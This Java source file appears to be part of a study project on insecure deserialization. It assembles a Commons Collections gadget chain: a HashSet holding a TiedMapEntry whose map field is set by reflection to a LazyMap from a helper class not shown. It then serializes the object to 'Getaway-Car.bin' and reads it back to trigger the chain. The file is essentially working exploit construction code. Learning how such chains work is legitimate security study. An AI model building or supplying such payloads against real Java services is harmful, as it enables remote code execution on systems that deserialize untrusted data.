package edu.demo.makeHashMSet;

import edu.demo.makeLzMap.MakeLzMap;
import edu.demo.makeTiedMap.MakeTiedMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashSet;

public class MakeHashMSet {
    public static void main(String[] args) throws Exception{
        Object payload = makeHashMSet();
        //test
        testSer(payload);
    }

    public static Object makeHashMSet() throws Exception{
        HashSet hashSet = new HashSet();
        TiedMapEntry tiedMap = (TiedMapEntry) MakeTiedMap.makeTiedMap();
        LazyMap lzMap = (LazyMap) MakeLzMap.makeLzMap();
        hashSet.add(tiedMap);
        Field field= tiedMap.getClass().getDeclaredField("map");
        field.setAccessible(true);
        field.set(tiedMap, lzMap);
        return hashSet; 
    }

    public static void testSer(Object payload) throws Exception{
        //ser
        FileOutputStream file = new FileOutputStream("Getaway-Car.bin");//think about the place where u first met me
        ObjectOutputStream se = new ObjectOutputStream(file);
        se.writeObject(payload);
        se.close();
        //deser
        FileInputStream file1 = new FileInputStream("Getaway-Car.bin");
        ObjectInputStream unse = new ObjectInputStream(file1);
        unse.readObject();
        unse.close();
    }
}
